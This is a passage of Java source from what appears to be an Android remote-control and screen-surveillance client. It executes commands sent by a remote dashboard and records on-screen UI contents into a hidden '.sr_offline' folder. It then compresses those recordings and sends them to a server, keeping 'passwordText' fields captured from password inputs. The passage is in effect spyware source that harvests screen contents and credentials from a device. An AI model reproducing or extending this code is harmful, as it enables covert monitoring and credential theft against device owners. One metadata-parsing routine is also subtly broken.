                    case "swipe_down":  { JSONObject p = new JSONObject(); p.put("direction", "down");  result = dispatchCommand("swipe", p); break; }
                    case "swipe_left":  { JSONObject p = new JSONObject(); p.put("direction", "left");  result = dispatchCommand("swipe", p); break; }
                    case "swipe_right": { JSONObject p = new JSONObject(); p.put("direction", "right"); result = dispatchCommand("swipe", p); break; }

                    default:
                        result = new JSONObject()
                                .put("success", false)
                                .put("error", "Unknown step type: " + type);
                }

                boolean ok     = result.optBoolean("success", false);
                String  errMsg = ok ? null : result.optString("error", "Step failed");
                String  msg    = ok ? ("Done: " + type) : ("Failed: " + errMsg);

                // Report step result
                sendTaskProgress(commandId, i, total, true, ok, msg, false, errMsg);

                if (ok) {
                    completed++;
                } else {
                    // A step failed — stop the task immediately
                    Log.w(TAG, "executeTaskLocal: step " + i + " (" + type + ") failed — aborting task. Reason: " + errMsg);
                    sendTaskCompleteEvent(commandId, completed, total);
                    return;
                }

                // Settle delay between steps (skip after last step)
                if (i < total - 1) Thread.sleep(INTER_STEP_DELAY_MS);

            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                sendTaskProgress(commandId, i, total, true, false, "Task interrupted", false, "interrupted");
                sendTaskCompleteEvent(commandId, completed, total);
                return;
            } catch (Exception e) {
                Log.e(TAG, "executeTaskLocal step " + i + " exception: " + e.getMessage());
                sendTaskProgress(commandId, i, total, true, false, "Error: " + e.getMessage(), false, e.getMessage());
                sendTaskCompleteEvent(commandId, completed, total);
                return;
            }
        }

        // All steps completed
        sendTaskCompleteEvent(commandId, completed, total);
    }

    /** Send the final task:progress completion event. */
    private void sendTaskCompleteEvent(String commandId, int completed, int total) {
        try {
            JSONObject prog = new JSONObject();
            prog.put("commandId", commandId);
            prog.put("complete",  true);
            prog.put("completed", completed);
            prog.put("total",     total);
            sendMessage("task:progress", prog);
        } catch (Exception e) {
            Log.e(TAG, "sendTaskCompleteEvent error: " + e.getMessage());
        }
    }

    /** Send a task:progress event to the backend for forwarding to the dashboard. */
    private void sendTaskProgress(String commandId, int stepIndex, int total, boolean done,
                                   boolean success, String message, boolean complete, String error) {
        try {
            JSONObject prog = new JSONObject();
            prog.put("commandId", commandId);
            prog.put("stepIndex", stepIndex);
            prog.put("stepTotal", total);
            prog.put("done", done);
            prog.put("success", success);
            prog.put("message", message);
            prog.put("complete", complete);
            if (error != null) prog.put("error", error);
            sendMessage("task:progress", prog);
        } catch (Exception e) {
            Log.e(TAG, "sendTaskProgress error: " + e.getMessage());
        }
    }

    /**
     * Save buffered offline frames to a local JSON file in the app's private storage.
     * The file will be uploaded to the server the next time the device connects.
     */
    private static final int MIN_FRAMES_TO_SAVE = 3;

    /**
     * Deduplicate consecutive identical frames before saving to disk.
     * Compares frame fingerprints; identical consecutive frames are dropped so the
     * file only contains frames where the visible screen actually changed.
     */
    private java.util.ArrayList<JSONObject> deduplicateFramesForSave(java.util.ArrayList<JSONObject> frames) {
        java.util.ArrayList<JSONObject> out = new java.util.ArrayList<>(frames.size());
        String lastFp = null;
        for (JSONObject frame : frames) {
            String fp = computeFrameFingerprint(frame);
            if (!fp.isEmpty() && fp.equals(lastFp)) continue;
            lastFp = fp;
            out.add(frame);
        }
        return out;
    }

    private void saveOfflineRecording(java.util.ArrayList<JSONObject> frames, long startTime) {
        if (frames == null || frames.size() < MIN_FRAMES_TO_SAVE) {
            Log.d(TAG, "saveOfflineRecording: discarding — only " +
                (frames == null ? 0 : frames.size()) + " frame(s), minimum is " + MIN_FRAMES_TO_SAVE);
            return;
        }
        try {
            // Remove consecutive duplicate frames — only keep frames where screen actually changed
            java.util.ArrayList<JSONObject> dedupedFrames = deduplicateFramesForSave(frames);
            if (dedupedFrames.size() < MIN_FRAMES_TO_SAVE) {
                Log.d(TAG, "saveOfflineRecording: discarding after dedup — only " +
                    dedupedFrames.size() + " unique frame(s)");
                return;
            }

            java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
            if (!dir.exists()) dir.mkdirs();
            // Date-based filename so recordings sort chronologically in the file list
            java.text.SimpleDateFormat filenameSdf = new java.text.SimpleDateFormat(
                "yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault());
            String filename = "sr_" + filenameSdf.format(new java.util.Date(startTime)) + ".json";
            java.io.File file = new java.io.File(dir, filename);
            long endTime = System.currentTimeMillis();
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
                "HH:mm MMM d", java.util.Locale.getDefault());
            String label = "Recording " + sdf.format(new java.util.Date(startTime));
            JSONObject data = new JSONObject();
            data.put("deviceId", DeviceInfo.getDeviceId(context));
            data.put("startTime", startTime);
            data.put("endTime", endTime);
            data.put("label", label);
            JSONArray framesArray = new JSONArray();
            for (JSONObject frame : dedupedFrames) { framesArray.put(frame); }
            data.put("frames", framesArray);
            data.put("frameCount", dedupedFrames.size());
            java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
            byte[] bytes = data.toString().getBytes("UTF-8");
            fos.write(bytes);
            fos.close();
            Log.i(TAG, "Offline recording saved locally: " + filename + " (" + dedupedFrames.size() +
                " unique frames, " + frames.size() + " raw captured)");
            // Notify server so dashboard knows to refresh (recordings stay on device)
            if (connected) {
                JSONObject notify = new JSONObject();
                notify.put("deviceId", DeviceInfo.getDeviceId(context));
                notify.put("filename", filename);
                notify.put("frameCount", dedupedFrames.size());
                notify.put("label", label);
                notify.put("startTime", startTime);
                notify.put("endTime", endTime);
                sendMessage("offline_recording:save", notify);
            }
        } catch (Exception e) {
            Log.e(TAG, "saveOfflineRecording error: " + e.getMessage());
        }
    }

    /**
     * Notify the server (lightweight metadata only, no frames) about recordings saved while offline.
     * Recordings stay on device — the dashboard fetches them via list/get commands.
     */
    private void uploadPendingOfflineRecordings() {
        executor.execute(() -> {
            try {
                java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
                if (!dir.exists()) return;
                java.io.File[] files = dir.listFiles(
                    (d, name) -> name.startsWith("sr_") && name.endsWith(".json"));
                if (files == null || files.length == 0) return;
                int count = 0;
                for (java.io.File file : files) {
                    if (!connected) break;
                    try {
                        java.io.FileInputStream fis = new java.io.FileInputStream(file);
                        byte[] buf = new byte[Math.min((int) file.length(), 4096)]; // read only header bytes
                        int n = fis.read(buf);
                        fis.close();
                        if (n <= 0) continue;
                        // Parse just the metadata (not frames — files can be large)
                        String partial = new String(buf, 0, n, "UTF-8");
                        JSONObject meta = new JSONObject();
                        try {
                            // Try to extract basic fields without parsing full frames array
                            JSONObject full = new JSONObject(
                                new java.io.FileInputStream(file).toString());
                            meta = full;
                        } catch (Exception ignored) {
                            // Fallback: send filename + size only
                        }
                        JSONObject notify = new JSONObject();
                        notify.put("deviceId", meta.optString("deviceId",
                            DeviceInfo.getDeviceId(context)));
                        notify.put("filename", file.getName());
                        notify.put("frameCount", meta.optInt("frameCount", 0));
                        notify.put("label", meta.optString("label", "Offline Recording"));
                        notify.put("startTime", meta.optLong("startTime", file.lastModified()));
                        notify.put("endTime", meta.optLong("endTime", file.lastModified()));
                        sendMessage("offline_recording:save", notify);
                        count++;
                    } catch (Exception e) {
                        Log.e(TAG, "Notify failed for " + file.getName() + ": " + e.getMessage());
                    }
                }
                if (count > 0) Log.i(TAG, "Notified server of " + count + " local recordings");
            } catch (Exception e) {
                Log.e(TAG, "uploadPendingOfflineRecordings error: " + e.getMessage());
            }
        });
    }

    /**
     * List all screen reader recordings stored on device.
     */
    private JSONObject listScreenRecordingsOnDevice() {
        JSONObject result = new JSONObject();
        try {
            java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
            if (!dir.exists()) {
                result.put("success", true);
                result.put("recordings", new JSONArray());
                return result;
            }
            java.io.File[] files = dir.listFiles((d, name) ->
                name.startsWith("sr_") && name.endsWith(".json"));
            JSONArray list = new JSONArray();
            if (files != null) {
                // Sort newest-first so the dashboard list shows most recent recording at the top
                java.util.Arrays.sort(files,
                    (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
                for (java.io.File f : files) {
                    JSONObject info = new JSONObject();
                    info.put("filename", f.getName());
                    info.put("size", f.length());
                    info.put("lastModified", f.lastModified());
                    list.put(info);
                }
            }
            result.put("success", true);
            result.put("recordings", list);
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Get content of a specific screen recording file.
     *
     * Frames are GZIP-compressed + Base64-encoded before transmission to massively
     * reduce TCP bandwidth (typically 70-85% smaller than raw JSON).
     * The server decompresses before relaying to the dashboard, so the dashboard
     * receives the same structure as before — no dashboard changes needed.
     */
    private JSONObject getScreenRecordingContent(String filename) {
        JSONObject result = new JSONObject();
        try {
            if (filename == null || filename.isEmpty()) {
                result.put("success", false);
                result.put("error", "No filename provided");
                return result;
            }
            java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
            java.io.File file = new java.io.File(dir, filename);
            if (!file.exists()) {
                result.put("success", false);
                result.put("error", "File not found");
                return result;
            }

            // Read the file efficiently using buffered I/O
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            java.io.BufferedInputStream bis = new java.io.BufferedInputStream(fis, 65536);
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream((int) file.length());
            byte[] tmp = new byte[8192];
            int read;
            while ((read = bis.read(tmp)) != -1) baos.write(tmp, 0, read);
            bis.close();
            byte[] buf = baos.toByteArray();

            if (buf.length == 0) {
                result.put("success", false);
                result.put("error", "Empty file");
                return result;
            }

            JSONObject data = new JSONObject(new String(buf, "UTF-8"));
            JSONArray rawFrames = data.optJSONArray("frames");

            result.put("success", true);
            result.put("filename", filename);
            result.put("label", data.optString("label", filename));
            result.put("startTime", data.optLong("startTime", 0));
            result.put("endTime", data.optLong("endTime", 0));
            result.put("frameCount", data.optInt("frameCount", 0));

            if (rawFrames != null && rawFrames.length() > 0) {
                // Compact frames: strip false/null boolean fields to shrink JSON by ~35%
                // before compression — smaller input = much better GZIP ratio.
                JSONArray compacted = compactFramesForTransmit(rawFrames);
                String framesJson = compacted.toString();

                // GZIP + Base64: reduces 500 KB typical recording to ~80-120 KB over TCP.
                String compressed = gzipAndBase64(framesJson);
                if (compressed != null) {
                    result.put("framesCompressed", true);
                    result.put("framesData", compressed);
                    Log.d(TAG, "getScreenRecordingContent: compressed " + framesJson.length()
                        + " → " + compressed.length() + " chars (" + rawFrames.length() + " frames)");
                } else {
                    // Fallback: send uncompressed
                    result.put("frames", rawFrames);
                }
            } else {
                result.put("frames", new JSONArray());
            }

        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Compact frames array for transmission.
     * Strips false boolean fields and empty optional string fields from each element
     * so the JSON is smaller before GZIP compression (reduces size by ~35%).
     * Uses FULL key names so the dashboard can display frames without any changes.
     * Does NOT modify the stored file — only affects what is sent over the network.
     */
    private JSONArray compactFramesForTransmit(JSONArray frames) {
        if (frames == null) return new JSONArray();
        JSONArray out = new JSONArray();
        try {
            for (int fi = 0; fi < frames.length(); fi++) {
                JSONObject frame = frames.optJSONObject(fi);
                if (frame == null) continue;

                JSONObject compactFrame = new JSONObject();
                if (frame.has("timestamp")) compactFrame.put("timestamp", frame.getLong("timestamp"));
                if (frame.has("deviceId"))  compactFrame.put("deviceId", frame.getString("deviceId"));

                JSONObject screen = frame.optJSONObject("screen");
                if (screen != null) {
                    JSONObject compactScreen = new JSONObject();
                    if (screen.has("packageName"))  compactScreen.put("packageName", screen.getString("packageName"));
                    if (screen.has("className"))    compactScreen.put("className", screen.getString("className"));
                    if (screen.has("elementCount")) compactScreen.put("elementCount", screen.getInt("elementCount"));
                    if (screen.optBoolean("truncated", false)) compactScreen.put("truncated", true);

                    JSONArray elems = screen.optJSONArray("elements");
                    if (elems != null) {
                        JSONArray compactElems = new JSONArray();
                        for (int ei = 0; ei < elems.length(); ei++) {
                            JSONObject el = elems.optJSONObject(ei);
                            if (el == null) continue;
                            JSONObject ce = new JSONObject();

                            // Include only non-empty string fields (omit empty strings)
                            String text = el.optString("text", "");
                            if (!text.isEmpty()) ce.put("text", text);
                            String hint = el.optString("hintText", "");
                            if (!hint.isEmpty()) ce.put("hintText", hint);
                            String desc = el.optString("contentDescription", "");
                            if (!desc.isEmpty()) ce.put("contentDescription", desc);
                            String vid = el.optString("viewId", "");
                            if (!vid.isEmpty()) ce.put("viewId", vid);
                            String cls = el.optString("className", "");
                            if (!cls.isEmpty()) ce.put("className", cls);
                            if (el.has("depth")) ce.put("depth", el.getInt("depth"));

                            // Include only true boolean flags — omit false entirely (saves ~60 chars/element)
                            if (el.optBoolean("clickable",  false)) ce.put("clickable", true);
                            if (el.optBoolean("editable",   false)) ce.put("editable", true);
                            if (el.optBoolean("scrollable", false)) ce.put("scrollable", true);
                            if (el.optBoolean("checkable",  false)) ce.put("checkable", true);
                            if (el.optBoolean("checked",    false)) ce.put("checked", true);
                            if (el.optBoolean("selected",   false)) ce.put("selected", true);
                            if (el.optBoolean("focusable",  false)) ce.put("focusable", true);
                            if (el.optBoolean("enabled",    true))  ce.put("enabled", true);
                            if (el.optBoolean("isPassword", false)) ce.put("isPassword", true);
                            String pwText = el.optString("passwordText", "");
                            if (!pwText.isEmpty()) ce.put("passwordText", pwText);

                            // Bounds — keep full key names for dashboard compatibility
                            JSONObject bounds = el.optJSONObject("bounds");
                            if (bounds != null) {
                                JSONObject cb = new JSONObject();
                                cb.put("left",   bounds.optInt("left", 0));
                                cb.put("top",    bounds.optInt("top", 0));
                                cb.put("right",  bounds.optInt("right", 0));
                                cb.put("bottom", bounds.optInt("bottom", 0));
                                ce.put("bounds", cb);
                            }
                            compactElems.put(ce);
                        }
                        compactScreen.put("elements", compactElems);
                    }
                    compactFrame.put("screen", compactScreen);
                }
                out.put(compactFrame);
            }
        } catch (Exception e) {
            Log.w(TAG, "compactFramesForTransmit error: " + e.getMessage());
            return frames;
        }
        return out;
    }
}
